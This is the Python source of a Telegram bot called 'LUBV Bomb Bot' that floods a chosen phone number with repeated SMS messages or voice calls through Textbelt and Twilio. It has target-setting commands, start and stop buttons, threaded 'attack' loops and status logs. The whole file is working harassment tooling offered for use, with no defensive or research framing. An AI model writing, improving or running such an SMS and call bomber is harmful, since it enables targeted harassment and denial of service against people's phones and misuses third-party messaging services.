import os, re, time, threading, requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# ========== READ ENVIRONMENT VARIABLES ==========
BOT_TOKEN = os.getenv("BOT_TOKEN")          # Must be set on server
TWILIO_SID = os.getenv("TWILIO_SID", "")
TWILIO_AUTH = os.getenv("TWILIO_AUTH", "")
TWILIO_FROM = os.getenv("TWILIO_FROM", "")

# ========== SMS & CALL APIS ==========
SMS_APIS = [
    {"name":"textbelt","url":"https://textbelt.com/text","method":"post","data":lambda n,m:{"phone":n,"message":m,"key":"textbelt"}},
]
if TWILIO_SID and TWILIO_SID != "":
    SMS_APIS.append({
        "name":"twilio",
        "url":f"https://api.twilio.com/2010-04-01/Accounts/{TWILIO_SID}/Messages.json",
        "method":"post",
        "auth":(TWILIO_SID, TWILIO_AUTH),
        "data":lambda n,m:{"To":n,"From":TWILIO_FROM,"Body":m}
    })
    CALL_APIS = [{
        "name":"twilio_voice",
        "url":f"https://api.twilio.com/2010-04-01/Accounts/{TWILIO_SID}/Calls.json",
        "method":"post",
        "auth":(TWILIO_SID, TWILIO_AUTH),
        "data":lambda n:{"To":n,"From":TWILIO_FROM,"Url":"http://demo.twilio.com/docs/voice.xml"}
    }]
else:
    CALL_APIS = []

active_attacks = {}
attack_logs = {}

def send_sms(number, message):
    for api in SMS_APIS:
        try:
            if api["method"] == "post":
                data = api["data"](number, message)
                if "auth" in api:
                    resp = requests.post(api["url"], data=data, auth=api["auth"], timeout=5)
                else:
                    resp = requests.post(api["url"], data=data, headers=api.get("headers", {}), timeout=5)
            else:
                params = api["params"](number, message)
                resp = requests.get(api["url"], params=params, timeout=5)
            if resp.status_code in [200, 201, 202]:
                return True, f"SMS sent via {api['name']}"
        except:
            continue
    return False, "All SMS APIs failed – check keys/credit"

def make_call(number):
    for api in CALL_APIS:
        try:
            data = api["data"](number)
            if "auth" in api:
                resp = requests.post(api["url"], data=data, auth=api["auth"], timeout=5)
            else:
                resp = requests.post(api["url"], data=data, headers=api.get("headers", {}), timeout=5)
            if resp.status_code in [200, 201, 202]:
                return True, f"Call initiated via {api['name']}"
        except:
            continue
    return False, "No call API available – set Twilio"

def attack_worker(user_id, target, mode, count=30, delay=3):
    logs = []
    for i in range(count):
        if not active_attacks.get(user_id, {}).get("running", False):
            logs.append("⏹️ Stopped by user")
            break
        if mode == "sms":
            ok, msg = send_sms(target, f"Test {i+1}")
        else:
            ok, msg = make_call(target)
        logs.append(f"{'✅' if ok else '❌'} {msg} (#{i+1})")
        attack_logs[user_id] = logs[-10:]
        time.sleep(delay)
    else:
        logs.append("🏁 Attack finished")
    attack_logs[user_id] = logs[-10:]
    if user_id in active_attacks:
        active_attacks[user_id]["running"] = False

async def start(update, context):
    keyboard = [
        [InlineKeyboardButton("🎯 Set Target", callback_data="set_target")],
        [InlineKeyboardButton("📱 SMS", callback_data="mode_sms"), InlineKeyboardButton("📞 Call", callback_data="mode_call")],
        [InlineKeyboardButton("▶️ Start Attack", callback_data="start_attack"), InlineKeyboardButton("⏹️ Stop Attack", callback_data="stop_attack")],
        [InlineKeyboardButton("📊 Status", callback_data="status")]
    ]
    await update.message.reply_text("🤖 *LUBV Bomb Bot*\nUse /settarget +1234567890 to set number.", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

async def set_target(update, context):
    user_id = update.effective_user.id
    if not context.args:
        await update.message.reply_text("Usage: /settarget +1234567890")
        return
    number = context.args[0]
    if not re.match(r'^\+?\d{7,15}$', number):
        await update.message.reply_text("Invalid. Use +1234567890")
        return
    active_attacks.setdefault(user_id, {"target":"","mode":"sms","running":False,"thread":None})["target"] = number
    await update.message.reply_text(f"✅ Target set to `{number}`", parse_mode="Markdown")

async def button_handler(update, context):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data

    if data == "set_target":
        await query.edit_message_text("Send /settarget +1234567890")
    elif data == "mode_sms":
        active_attacks.setdefault(user_id, {"target":"","mode":"sms","running":False,"thread":None})["mode"] = "sms"
        await query.edit_message_text("📱 Mode: SMS")
    elif data == "mode_call":
        if not CALL_APIS:
            await query.edit_message_text("❌ Call not available – set Twilio keys")
            return
        active_attacks.setdefault(user_id, {"target":"","mode":"call","running":False,"thread":None})["mode"] = "call"
        await query.edit_message_text("📞 Mode: Call")
    elif data == "start_attack":
        att = active_attacks.get(user_id)
        if not att or not att.get("target"):
            await query.edit_message_text("⚠️ Set target first")
            return
        if att.get("running"):
            await query.edit_message_text("⚠️ Already running")
            return
        att["running"] = True
        t = threading.Thread(target=attack_worker, args=(user_id, att["target"], att["mode"], 30, 3))
        t.daemon = True
        t.start()
        att["thread"] = t
        await query.edit_message_text(f"▶️ Attacking {att['target']} ({att['mode']})")
    elif data == "stop_attack":
        if user_id in active_attacks:
            active_attacks[user_id]["running"] = False
            await query.edit_message_text("⏹️ Stopped")
        else:
            await query.edit_message_text("No attack")
    elif data == "status":
        att = active_attacks.get(user_id, {})
        text = f"Target: {att.get('target','None')}\nMode: {att.get('mode','None')}\nRunning: {'Yes' if att.get('running') else 'No'}\n"
        logs = attack_logs.get(user_id, [])
        text += "Logs:\n" + "\n".join(logs[-5:]) if logs else "No logs"
        await query.edit_message_text(text)

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("settarget", set_target))
    app.add_handler(CallbackQueryHandler(button_handler))
    print("✅ Bot is live!")
    app.run_polling()

if __name__ == "__main__":
    main()
